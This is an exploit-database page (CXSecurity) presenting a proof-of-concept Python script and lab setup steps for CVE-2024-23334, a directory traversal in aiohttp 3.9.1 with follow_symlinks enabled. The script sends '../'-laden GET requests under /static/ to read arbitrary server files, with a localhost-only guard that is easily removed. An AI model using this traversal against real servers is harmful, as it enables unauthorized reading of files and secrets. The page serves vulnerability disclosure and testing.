---
title: aiohttp 3.9.1 Directory Traversal
url: https://cxsecurity.com/issue/WLB-2026020007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-05
fetch_date: 2026-02-06T04:08:35.394317
---

# aiohttp 3.9.1 Directory Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **aiohttp 3.9.1 Directory Traversal** **2026.02.05**  Credit:  **[Beatriz Fresno Naumova](https://cxsecurity.com/author/Beatriz%2BFresno%2BNaumova/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-23334](https://cxsecurity.com/cveshow/CVE-2024-23334/ "Click to see CVE-2024-23334")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "CWE-22")** | |

# Exploit Title: Python aiohttp directory traversal PoC (CVE-2024-23334)
# Google Dork: N/A
# Date: 2025-10-06
# Exploit Author: Beatriz Fresno Naumova
# Vendor Homepage: https://www.aiohttp.org / https://www.python.org
# Software Link: https://github.com/aio-libs/aiohttp (vulnerable tag: 3.9.1)
# Version: aiohttp 3.9.1 (vulnerable)
# Tested on: Linux (host for Vulhub / Docker) and inside container VM: aiohttp 3.9.1
# CVE: CVE-2024-23334
# Description:
# Proof-of-concept to verify directory-traversal behavior when aiohttp is configured
# to serve static files with follow\_symlinks=True (affects aiohttp <= 3.9.1).
# This PoC is intentionally restricted to local testing and will refuse non-local targets.
# Environment setup (Vulhub example):
# 1. Obtain Vulhub and change to the aiohttp 3.9.1 directory:
# cd vulhub/python/aiohttp/3.9.1
# 2. Start the vulnerable service:
# docker compose up -d
# 3. Verify the service is accessible on localhost:8080:
# curl -v http://localhost:8080/ # should respond
#
# Prepare a safe probe file inside the container (non-sensitive):
# 1. Identify the container name or ID with `docker ps`.
# 2. Create a test token file inside the container:
# docker exec -it <container> /bin/sh -c "echo 'POC-AIOHTTP-VULN-TEST' > /tmp/poc-aiohttp-test.txt && chmod 644 /tmp/poc-aiohttp-test.txt"
# 3. Verify:
# docker exec -it <container> /bin/sh -c "cat /tmp/poc-aiohttp-test.txt"
# # should print: POC-AIOHTTP-VULN-TEST
#
# How to run this PoC (local only):
# 1. Save this file as poc\_aiohttp\_cve-2024-23334.py
# 2. Run it on the host that has access to the vulnerable container's localhost port:
# python3 poc\_aiohttp\_cve-2024-23334.py --port 8080 --probe /tmp/poc-aiohttp-test.txt --depth 8
#
#!/usr/bin/env python3
"""
Safe local-only PoC verifier for CVE-2024-23334 (aiohttp static follow\_symlinks).
This script will refuse to target any host other than localhost/127.0.0.1/::1.
Example:
python3 poc\_aiohttp\_cve-2024-23334.py --port 8080 --probe /tmp/poc-aiohttp-test.txt --depth 8
If the vulnerable server returns the probe file contents, the script prints the body
and reports VULNERABLE.
"""
from \_\_future\_\_ import annotations
import argparse
import socket
import sys
import urllib.parse
import http.client
LOCAL\_HOSTS = {"127.0.0.1", "localhost", "::1"}
def is\_localhost(host: str) -> bool:
"""Only allow local hosts to avoid misuse."""
return host in LOCAL\_HOSTS
def build\_traversal\_path(probe\_path: str, depth: int = 8) -> str:
"""
Build a traversal-style path to append to /static/.
Depth can be adjusted if the server root / static layout needs more ../ segments.
"""
probe = probe\_path.lstrip("/")
ups = "../" \* depth
return f"/static/{ups}{probe}"
def try\_connect(host: str, port: int, timeout: float = 3.0) -> bool:
try:
with socket.create\_connection((host, port), timeout=timeout):
return True
except Exception:
return False
def send\_get(host: str, port: int, path: str, timeout: float = 10.0):
conn = http.client.HTTPConnection(host, port, timeout=timeout)
try:
conn.request("GET", path, headers={"User-Agent": "poc-aiohttp-check/1.0", "Accept": "\*/\*"})
resp = conn.getresponse()
body = resp.read()
return resp.status, body
finally:
try:
conn.close()
except Exception:
pass
def main():
parser = argparse.ArgumentParser(description="Local-only PoC verifier for aiohttp traversal (CVE-2024-23334).")
parser.add\_argument("--host", default="127.0.0.1", help="Target host (MUST be localhost).")
parser.add\_argument("--port", type=int, default=8080, help="Target port (default: 8080).")
parser.add\_argument("--probe", required=True, help="Absolute path on server to probe (e.g. /tmp/poc-aiohttp-test.txt).")
parser.add\_argument("--depth", type=int, default=8, help="Traversal depth (increase if needed).")
parser.add\_argument("--timeout", type=float, default=10.0, help="Request timeout seconds.")
args = parser.parse\_args()
host = args.host.strip()
port = int(args.port)
if not is\_localhost(host):
print("ERROR: This PoC is restricted to localhost for safety. Use only in an isolated lab.", file=sys.stderr)
sys.exit(2)
# quick reachability check
if not try\_connect(host, port, timeout=3.0):
print(f"ERROR: cannot reach {host}:{port}. Is the vulnerable server running and port exposed on localhost?", file=sys.stderr)
sys.exit(3)
path = build\_traversal\_path(args.probe, depth=args.depth)
# encode path but keep slash and common safe chars
path = urllib.parse.quote(path, safe="/?=&%")
print(f"[\*] Sending GET {path} to {host}:{port} (local lab only)")
status, body = send\_get(host, port, path, timeout=args.timeout)
print(f"[+] HTTP {status}")
if body:
try:
text = body.decode("utf-8", errors="replace")
except Exception:
text = repr(body)
print("----- RESPONSE BODY START -----")
print(text)
print("----- RESPONSE BODY END -----")
# heuristic: check for the expected test token
if "POC-AIOHTTP-VULN-TEST" in text:
print("[!] VULNERABLE: test token found in response (lab-confirmed).")
sys.exit(0)
else:
print("[ ] Test token not found in response. The server may not be vulnerable or probe path/depth needs adjustment.")
sys.exit(1)
else:
print("[ ] Empty response body.")
sys.exit(1)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x...